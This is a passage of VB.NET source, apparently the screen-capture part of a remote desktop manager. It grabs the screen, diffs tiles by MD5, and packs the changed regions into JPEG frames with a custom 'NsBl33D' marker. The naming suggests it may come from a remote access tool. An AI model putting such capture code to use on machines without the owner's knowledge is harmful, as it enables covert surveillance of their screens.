        zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
        Return zs
    End Function
    Private Shared Function Gd(Optional ByVal Wi As Integer = 0, Optional ByVal He As Integer = 0, Optional ByVal Sh As Boolean = True) As Image
        Dim W As Integer = Screen.PrimaryScreen.Bounds.Width
        Dim H As Integer = Screen.PrimaryScreen.Bounds.Height
        Dim B As New Bitmap(W, H)
        Dim g As Graphics = Graphics.FromImage(B)
        g.CompositingQuality = CompositingQuality.HighSpeed
        g.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
        If Sh Then
            Try
                Cursors.Default.Draw(g, New Rectangle(Cursor.Position, New Size(32, 32)))
            Catch ex As Exception
            End Try
        End If
        g.Dispose()
        If Wi = 0 And He = 0 Then
            Return B
        Else
            Return B.GetThumbnailImage(Wi, He, Nothing, Nothing)
        End If
    End Function
    Private Shared Function md5(ByVal bB As Byte()) As String
        Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider
        bB = md5Obj.ComputeHash(bB)
        Return Convert.ToBase64String(bB)
    End Function
    Private Shared Function GetEncoderInfo(ByVal M As String) As ImageCodecInfo
        Dim j As Integer
        Dim encoders As ImageCodecInfo()
        encoders = ImageCodecInfo.GetImageEncoders()
        For j = 0 To encoders.Length
            If encoders(j).MimeType = M Then
                Return encoders(j)
            End If
        Next j
        Return Nothing
    End Function
    Shared Sub Clear()
        oQ = -1
        oCo = -1
        oQu = -1
        OM = New Bitmap(1, 1)
    End Sub

    Private Shared oQ As Integer = 0
    Private Shared oCo As Integer = 0
    Private Shared oQu As Integer = 0
    Shared Function Cap(ByVal q As Integer, ByVal co As Integer, ByVal Qu As Integer) As Byte()
ee:
        Dim ZS As New Size(QZ(q))
        ZS.Width = Mid(ZS.Width.ToString, 1, ZS.Width.ToString.Length - 1) & 0
        ZS.Height = Mid(ZS.Height.ToString, 1, ZS.Height.ToString.Length - 1) & 0
        If OM.Size.Width <> ZS.Width Or OM.Height <> ZS.Height Or oCo <> co Or oQu <> Qu Then
            OA.Clear()
            OAA.Clear()
            OM = New Bitmap(ZS.Width, ZS.Height)
        End If
        oQ = q
        oCo = co
        oQu = Qu

        Dim A As New List(Of Bitmap)
        Dim AA As New List(Of Point)
        Dim m As Bitmap
        If OA.Count > 0 Then
            A.AddRange(OA.ToArray)
            OA.Clear()
            AA.AddRange(OAA.ToArray)
            OAA.Clear()

            m = OM
            GoTo e
        End If
        m = Gd(ZS.Width, ZS.Height)
        Dim w As Integer = ZS.Width
        Dim h As Integer = ZS.Height
        Dim K As Integer = 0
        For i As Integer = 0 To co - 1
            For ii As Integer = 0 To co - 1
                Dim y As Integer = h / co * i
                Dim x As Integer = w / co * ii
                Dim wc As Integer = w / co
                Dim hc As Integer = h / co
                If wc.ToString.Contains(".") Then
                    wc = Split(wc, ".")(0)
                End If
                If hc.ToString.Contains(".") Then
                    hc = Split(hc, ".")(0)
                End If
                Dim MM As New IO.MemoryStream
                Dim Mj = m.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                Dim MJJ = OM.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                Dim b1 As Byte()
                Dim b2 As Byte()
                Mj.Save(MM, Imaging.ImageFormat.Jpeg)
                b1 = MM.ToArray
                MM.Dispose()
                MM = New IO.MemoryStream
                MJJ.Save(MM, Imaging.ImageFormat.Jpeg)

                b2 = MM.ToArray

                MM.Dispose()
                If md5(b1) = md5(b2) Then
                    Mj.Dispose()
                Else
                    A.Add(Mj)
                    AA.Add(New Point(x, y))
                End If
                MJJ.Dispose()
nx:
            Next
        Next
e:

        If A.Count = 0 Then
            Return New Byte() {0}
        End If
        Dim hh As Integer = 0
        Dim QA As New List(Of Integer)
        For i As Integer = 0 To co * co / 5
            If i = A.Count Then Exit For
            QA.Add(i)
            hh += A(i).Height
        Next
        Dim xx As New Bitmap(A(0).Width, hh)
        Dim gg = Graphics.FromImage(xx)
        Dim tp As Integer = 0
        Dim s As String = m.Width & "." & m.Height & ","
        For Each i As Integer In QA
            s += AA(i).X & "." & AA(i).Y & "." & A(i).Height & ","
            gg.DrawImage(A(i), 0, tp)
            tp += A(i).Height
        Next
        s += "NsBl33D"
        For i As Integer = 0 To A.Count - 1
            If QA.Contains(i) = False Then
                OA.Add(A(i))
                OAA.Add(AA(i))
            End If
        Next
        gg.Dispose()
        Dim JA = New IO.MemoryStream
        Dim eps As EncoderParameters = New EncoderParameters(1)
        eps.Param(0) = New EncoderParameter(Drawing.Imaging.Encoder.Quality, Qu)
        Dim ici As ImageCodecInfo = GetEncoderInfo("image/jpeg")
        xx.Save(JA, ici, eps)
        Dim J2 As New IO.MemoryStream
        J2.Write(System.Text.Encoding.Default.GetBytes(s), 0, s.Length)
        J2.Write(JA.ToArray, 0, JA.Length)
        OM = m
        xx.Dispose()
        Return J2.ToArray
    End Function
End Class ''Rmote_Desktop_Manager
